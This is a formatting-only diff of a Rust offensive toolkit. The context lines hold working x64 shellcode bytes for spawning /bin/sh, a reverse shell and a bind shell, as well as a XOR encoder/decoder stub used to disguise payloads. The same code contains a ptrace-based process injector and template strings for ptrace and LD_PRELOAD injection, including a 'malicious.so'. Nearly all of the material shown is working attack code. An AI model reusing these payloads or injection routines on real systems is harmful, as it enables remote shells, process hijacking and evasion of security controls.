@@ -124,13 +124,14 @@ impl Shellcode {
         let code = vec![
             0x48, 0x31, 0xf6, // xor rsi, rsi
             0x56, // push rsi
-            0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, // movabs rdi, "//bin/sh"
-            0x57,       // push rdi
-            0x54,       // push rsp
-            0x5f,       // pop rdi
+            0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73,
+            0x68, // movabs rdi, "//bin/sh"
+            0x57, // push rdi
+            0x54, // push rsp
+            0x5f, // pop rdi
             0x6a, 0x3b, // push 0x3b (execve syscall)
-            0x58,       // pop rax
-            0x99,       // cdq
+            0x58, // pop rax
+            0x99, // cdq
             0x0f, 0x05, // syscall
         ];
         Self {
@@ -172,16 +173,16 @@ impl Shellcode {
 
         // Continue with connect and dup2
         code.extend_from_slice(&[
-            0x51,       // push rcx
+            0x51, // push rcx
             0x48, 0x89, 0xe6, // mov rsi, rsp
             0x6a, 0x10, // push 16 (sizeof sockaddr_in)
-            0x5a,       // pop rdx
+            0x5a, // pop rdx
             0x6a, 0x2a, // push 0x2a (connect)
-            0x58,       // pop rax
+            0x58, // pop rax
             0x0f, 0x05, // syscall
             // dup2 loop for stdin/stdout/stderr
             0x6a, 0x03, // push 3
-            0x5e,       // pop rsi
+            0x5e, // pop rsi
             0x48, 0xff, 0xce, // dec rsi
             0x6a, 0x21, // push 0x21 (dup2)
             0x58, // pop rax
@@ -224,25 +225,25 @@ impl Shellcode {
         code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // INADDR_ANY
 
         code.extend_from_slice(&[
-            0x51,       // push rcx
+            0x51, // push rcx
             0x48, 0x89, 0xe6, // mov rsi, rsp
             0x6a, 0x10, // push 16
-            0x5a,       // pop rdx
+            0x5a, // pop rdx
             0x6a, 0x31, // push 0x31 (bind)
-            0x58,       // pop rax
+            0x58, // pop rax
             0x0f, 0x05, // syscall
             // listen(fd, 1)
             0x6a, 0x32, // push 0x32 (listen)
-            0x58,       // pop rax
+            0x58, // pop rax
             0x6a, 0x01, // push 1
-            0x5e,       // pop rsi
+            0x5e, // pop rsi
             0x0f, 0x05, // syscall
             // accept(fd, NULL, NULL)
             0x6a, 0x2b, // push 0x2b (accept)
-            0x58,       // pop rax
-            0x99,       // cdq
-            0x52,       // push rdx
-            0x52,       // push rdx
+            0x58, // pop rax
+            0x99, // cdq
+            0x52, // push rdx
+            0x52, // push rdx
             0x48, 0x89, 0xe6, // mov rsi, rsp
             0x0f, 0x05, // syscall
             0x48, 0x97, // xchg rdi, rax
@@ -292,19 +293,34 @@ impl Shellcode {
 
         // XOR decoder stub for x64
         let decoder = vec![
-            0x48, 0x31, 0xc9, // xor rcx, rcx
-            0x48, 0x81, 0xc1, // add rcx, shellcode_len
+            0x48,
+            0x31,
+            0xc9, // xor rcx, rcx
+            0x48,
+            0x81,
+            0xc1, // add rcx, shellcode_len
             (self.code.len() & 0xFF) as u8,
             ((self.code.len() >> 8) & 0xFF) as u8,
             ((self.code.len() >> 16) & 0xFF) as u8,
             ((self.code.len() >> 24) & 0xFF) as u8,
-            0xeb, 0x0a, // jmp short (skip key)
-            0x5e,       // pop rsi (get shellcode addr)
-            0x80, 0x36, key, // xor byte [rsi], key
-            0x48, 0xff, 0xc6, // inc rsi
-            0xe2, 0xf8, // loop
-            0xeb, 0x05, // jmp shellcode
-            0xe8, 0xf1, 0xff, 0xff, 0xff, // call (push addr)
+            0xeb,
+            0x0a, // jmp short (skip key)
+            0x5e, // pop rsi (get shellcode addr)
+            0x80,
+            0x36,
+            key, // xor byte [rsi], key
+            0x48,
+            0xff,
+            0xc6, // inc rsi
+            0xe2,
+            0xf8, // loop
+            0xeb,
+            0x05, // jmp shellcode
+            0xe8,
+            0xf1,
+            0xff,
+            0xff,
+            0xff, // call (push addr)
         ];
 
         // XOR encode the original shellcode
@@ -379,7 +395,13 @@ impl ProcessInjector {
 
         unsafe {
             // Attach to process
-            if libc::ptrace(libc::PTRACE_ATTACH, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>()) == -1 {
+            if libc::ptrace(
+                libc::PTRACE_ATTACH,
+                pid,
+                std::ptr::null_mut::<c_void>(),
+                std::ptr::null_mut::<c_void>(),
+            ) == -1
+            {
                 return InjectionResult {
                     success: false,
                     error: Some("Failed to attach to process".to_string()),
@@ -401,7 +423,12 @@ impl ProcessInjector {
                 &mut regs as *mut _ as *mut c_void,
             ) == -1
             {
-                libc::ptrace(libc::PTRACE_DETACH, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>());
+                libc::ptrace(
+                    libc::PTRACE_DETACH,
+                    pid,
+                    std::ptr::null_mut::<c_void>(),
+                    std::ptr::null_mut::<c_void>(),
+                );
                 return InjectionResult {
                     success: false,
                     error: Some("Failed to get registers".to_string()),
@@ -432,10 +459,20 @@ impl ProcessInjector {
             }
 
             // Continue execution
-            libc::ptrace(libc::PTRACE_CONT, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>());
+            libc::ptrace(
+                libc::PTRACE_CONT,
+                pid,
+                std::ptr::null_mut::<c_void>(),
+                std::ptr::null_mut::<c_void>(),
+            );
 
             // Detach
-            libc::ptrace(libc::PTRACE_DETACH, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>());
+            libc::ptrace(
+                libc::PTRACE_DETACH,
+                pid,
+                std::ptr::null_mut::<c_void>(),
+                std::ptr::null_mut::<c_void>(),
+            );
 
             InjectionResult {
                 success: true,
@@ -482,8 +519,7 @@ impl ProcessInjector {
 /// Generate injection code for various scenarios
 pub fn generate_injection_code(method: InjectionMethod, arch: Architecture) -> String {
     match method {
-        InjectionMethod::PtraceInjection => {
-            r#"
+        InjectionMethod::PtraceInjection => r#"
 // Ptrace injection example (Linux)
 unsafe {
     ptrace(PTRACE_ATTACH, target_pid, null(), null());
@@ -502,10 +538,8 @@ unsafe {
     ptrace(PTRACE_DETACH, target_pid, null(), null());
 }
 "#
-            .to_string()
-        }
-        InjectionMethod::LdPreload => {
-            r#"
+        .to_string(),
+        InjectionMethod::LdPreload => r#"
 // LD_PRELOAD injection (Linux)
 // 1. Create malicious shared library
 // 2. Set LD_PRELOAD environment variable
@@ -514,8 +548,7 @@ unsafe {
 std::env::set_var("LD_PRELOAD", "/path/to/malicious.so");
 std::process::Command::new("target_program").spawn();
 "#
-            .to_string()
-        }
+        .to_string(),
         _ => format!("// {:?} injection not implemented for {:?}", method, arch),
     }
 }
